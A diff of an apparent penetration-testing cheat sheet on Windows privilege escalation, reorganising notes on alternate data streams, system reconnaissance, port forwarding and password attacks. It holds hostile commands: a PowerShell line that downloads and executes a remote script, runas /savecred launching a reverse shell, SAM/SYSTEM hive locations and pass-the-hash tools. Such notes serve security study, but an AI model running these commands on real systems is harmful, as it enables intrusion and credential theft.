@@ -21,7 +21,7 @@ No nonsense - straight to business
 Weak Registry
 {% endembed %}
 
-Watch out for ADS (Alternate data streams) - good way to hide data (`dir /r` lists it out for you)&#x20;
+Watch out for ADS (Alternate data streams) - good way to hide data (`dir /R` lists it out for you)&#x20;
 
 Host file -`C:\Windows\System32\drivers\etc\hosts`
 
@@ -39,12 +39,10 @@ iwr -Uri "[file_url]" -OutFile "$env:TEMP\[file]";
 iex "$env:TEMP\shell.ps1"
 ```
 
-if psexec dont work, smbexec.py (half shell) or wmiexec
-
 ### Basic Info gathering
 
 ```
-systeminfo - (ready exploits might be there for outdated versions)
+systeminfo - (look for latest hotfixes patched)
 wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
 wmic logicaldisk get caption,description,providername
 ```
@@ -109,15 +107,16 @@ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
 
 Password exploits
 
-* Saved creds
-* Registry - The registry can be searched for keys and values that contain the word "password":
-* SAM (Security Account Manager)
-* Pass the hash
+*   Saved creds
 
-```
-cmdkey /list
-runas /savecred /user:username C:\PrivEsc\reverse.exe
-```
+    ```
+    cmdkey /list
+    runas /savecred /user:username C:\PrivEsc\reverse.exe
+    ```
+* Registry - The registry can be searched for keys and values that contain the word "password":
+* SAM (Security Account Manager)\
+  SAM and SYSTEM can be found at `Windows/System32/config`
+* Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`
 
 ## Service Exploits
 
